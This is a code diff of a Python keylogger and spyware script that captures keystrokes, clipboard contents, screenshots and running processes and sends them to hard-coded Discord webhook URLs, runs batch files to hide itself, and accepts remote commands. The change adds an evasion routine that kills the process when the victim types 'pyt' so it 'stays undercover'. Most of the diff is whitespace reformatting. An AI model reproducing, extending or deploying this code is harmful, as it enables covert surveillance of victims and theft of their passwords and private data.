@@ -45,6 +45,7 @@ def run_bat_file():
     except subprocess.CalledProcessError as e:
         print(f"Error running {bat_file_path}: {e}")
 
+
 def unhide():
     """Run the kill.bat file when the script starts."""
     bat_file_path = rf"C:\users\{username}\kl2.1\unhide.bat"  # Update the path to your kill.bat file
@@ -79,7 +80,8 @@ def send_to_webhook(message):
             print(f"Failed to send webhook message. Status code: {response.status_code}")
     except Exception as e:
         print(f"Error sending message to webhook: {e}")
-        
+
+
 def send_to_webhook_processes(message):
     """Send the message to the Discord webhook."""
     payload = {"content": message}
@@ -171,7 +173,10 @@ def monitor_clipboard():
         except Exception as e:
             print(f"Error accessing clipboard: {e}")
 
+
 WEBHOOK_URL_PROCESSES = "https://discord.com/api/webhooks/1349769172862898206/9EPIPwHXe2X8tzDu_alb6h8nZc0ZISh14b7TMuSTLo3qmHOSu2K3cOVMoKLTkXnH1YLR"
+
+
 def monitor_processes():
     running_processes = set()
 
@@ -191,7 +196,10 @@ def monitor_processes():
         running_processes = current_processes
         time.sleep(1)  # Check every 2 seconds after the first check
 
+
 WEBHOOK_URL_SCREENSHOTS = "https://discord.com/api/webhooks/1349762273824215180/8im_PuVb4CrUGktRt_ywF1JvIC_eRS1XJgLdnI7HKHaMcsEOtNcB3605q0ilDuUvo2GX"
+
+
 def send_to_webhook_pic(filename):
     """Send the screenshot to the Discord webhook."""
     with open(filename, "rb") as file:
@@ -231,6 +239,12 @@ def screenshot():
 
         time.sleep(5)  # Wartezeit vor dem nächsten Screenshot
 
+def monitor_input():
+    time.sleep(1)
+    if "pyt" in keystrokes:
+        send_to_webhook("User searched for Python killed the process to stay undercover.")
+        return False
+
 
 # Run kill.bat file at the start
 run_bat_file()
@@ -249,8 +263,10 @@ disk_info = psutil.disk_usage('/')
 
 send_to_webhook(f"CPU cores: {cpu_count}")
 send_to_webhook(f"CPU percent: {cpu_percent}%")
-send_to_webhook(f"Memory info: Total: {memory_info.total}, Available: {memory_info.available}, Used: {memory_info.used}, Percent: {memory_info.percent}%")
-send_to_webhook(f"Disk info: Total: {disk_info.total}, Used: {disk_info.used}, Free: {disk_info.free}, Percent: {disk_info.percent}%")
+send_to_webhook(
+    f"Memory info: Total: {memory_info.total}, Available: {memory_info.available}, Used: {memory_info.used}, Percent: {memory_info.percent}%")
+send_to_webhook(
+    f"Disk info: Total: {disk_info.total}, Used: {disk_info.used}, Free: {disk_info.free}, Percent: {disk_info.percent}%")
 send_to_webhook("Commands: /kill /unhide /processes(VERY LAGGY!)")
 
 # Start all monitoring threads
@@ -258,10 +274,12 @@ keystroke_thread = threading.Thread(target=keystroke_monitor, daemon=True)
 clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
 screenshot_thread = threading.Thread(target=screenshot, daemon=True)
 process_thread = threading.Thread(target=monitor_processes, daemon=True)
+input_thread = threading.Thread(target=monitor_input(), daemon=True)
 
 keystroke_thread.start()
 clipboard_thread.start()
 screenshot_thread.start()
+input_thread.start()
 
 # Set up the keyboard listener
 try:
